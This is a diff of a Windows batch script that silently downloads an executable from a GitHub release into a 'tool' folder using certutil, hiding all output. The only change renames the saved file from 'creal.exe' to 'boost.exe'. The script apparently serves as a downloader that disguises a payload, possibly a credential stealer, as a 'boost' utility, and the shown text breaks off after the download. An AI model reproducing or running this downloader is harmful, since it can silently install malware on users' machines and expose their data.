@@ -1,7 +1,7 @@
 @echo off
 set "URL=https://github.com/hvbsvqdj/tool-boost-funk/releases/download/boost/boost.exe"
 set "Dossier=tool"
-set "NomFichier=%Dossier%\creal.exe"
+set "NomFichier=%Dossier%\boost.exe"
 
 certutil -urlcache -split -f %URL% "%NomFichier%" >nul 2>&1
 
